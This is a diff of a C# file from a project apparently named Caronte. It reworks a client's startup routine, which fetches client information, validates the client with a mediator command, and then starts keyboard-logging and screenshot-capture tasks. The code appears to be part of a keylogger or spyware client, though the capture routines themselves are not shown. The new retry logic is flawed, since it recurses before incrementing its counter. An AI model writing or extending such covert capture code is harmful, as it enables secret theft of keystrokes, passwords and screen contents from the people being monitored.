@@ -1,5 +1,5 @@
 ﻿using Caronte.Modules.Command;
-using Caronte.Modules.CreateClientUser;
+using Caronte.Modules.ValidateClient;
 using Caronte.Modules.Information;
 using Caronte.Modules.Information.GetClientInformation;
 using MediatR;
@@ -13,6 +13,7 @@ namespace Caronte
     {
         private readonly IMediator _mediator;
         private readonly CancellationToken _cancellationToken;
+        private int InitilizeRetries;
 
         public Execution(IMediator mediator, CancellationToken cancellationToken)
         {
@@ -22,16 +23,29 @@ namespace Caronte
 
         public async Task Initialize()
         {
-            var clientResponse = await _mediator.Send(new GetClientInformationQuery());
-            await _mediator.Send(new VerifyAndCreateClientUserCommand() { ClientInformation = clientResponse.ResponseObject});
+            var getClientInformationResponse = await _mediator.Send(new GetClientInformationQuery());
 
-            var tasksList = new List<Task>
+            if (!getClientInformationResponse.IsSucessFull)
             {
-                StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
-                StartInformationServices.InitializePrintScreenTask(_cancellationToken, _mediator),
-            };
+                if (InitilizeRetries <= 5)
+                    await Initialize();
 
-            await Task.WhenAll(tasksList);
+                InitilizeRetries++;
+                return;
+            }
+
+            var verifyAndCreateClientResponse = await _mediator.Send(new ValidateClientCommand() { ClientInformation = getClientInformationResponse.ResponseObject });
+
+            if (verifyAndCreateClientResponse.IsSucessFull)
+            {
+                var tasksList = new List<Task>
+                {
+                    StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
+                    StartInformationServices.InitializePrintScreenTask(_cancellationToken, _mediator),
+                };
+
+                await Task.WhenAll(tasksList);
+            }
         }
     }
 }
